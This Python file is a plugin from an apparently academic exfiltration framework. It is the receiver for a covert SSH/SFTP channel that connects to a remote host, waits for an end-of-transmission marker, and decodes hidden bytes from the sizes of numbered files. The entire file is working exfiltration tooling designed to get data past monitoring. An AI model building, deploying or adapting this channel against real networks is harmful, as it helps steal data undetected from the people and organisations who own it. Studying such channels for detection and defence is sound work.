from __future__ import annotations
from typing import Dict, Any, Iterable
import re, paramiko, time

from tfg.plugins.api import ExfilServerPlugin

BASE = 4096


class SshServerSize(ExfilServerPlugin):
    canal = "SSH"
    metodo = 3
    name = "ssh_server_size"

    def run(self, config: Dict[str, Any]) -> Iterable[bytes]:
        host = config["host"]
        port = int(config.get("port", 22))
        user = config["user"]
        password = config.get("password")
        pkey_path = config.get("pkey_path")
        remote_dir = config.get("remote_dir") or "."
        exfil_id = config.get("exfil_id") or "tfg"
        poll_interval = float(config.get("poll_interval_s", 0.5))
        timeout_s = config.get("timeout_s")
        timeout_s = int(timeout_s) if timeout_s is not None else None

        pat = re.compile(rf"^{re.escape(exfil_id)}\.sz\.(\d{{6}})$")
        eot_name = f"{exfil_id}.EOT"

        key = paramiko.RSAKey.from_private_key_file(pkey_path) if pkey_path else None
        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        ssh.connect(hostname=host, port=port, username=user, password=password, pkey=key, look_for_keys=False)
        sftp = ssh.open_sftp()
        try:
            sftp.chdir(remote_dir)
            deadline = None if timeout_s is None else (time.time() + timeout_s)
            while True:
                names = sftp.listdir(".")
                if eot_name in names:
                    break
                if deadline is not None and time.time() >= deadline:
                    break
                time.sleep(poll_interval)

            attrs = sftp.listdir_attr(".")
            parts = []
            for a in attrs:
                m = pat.match(a.filename)
                if not m:
                    continue
                parts.append((int(m.group(1)), a))
            parts.sort(key=lambda item: item[0])
            out = bytearray()
            for _seq, a in parts:
                b = (a.st_size - BASE) & 0xFF
                out.append(b)

            def gen():
                if out:
                    yield bytes(out)
                sftp.close()
                ssh.close()

            return gen()
        except Exception:
            try:
                sftp.close()
                ssh.close()
            except Exception:
                pass
            raise
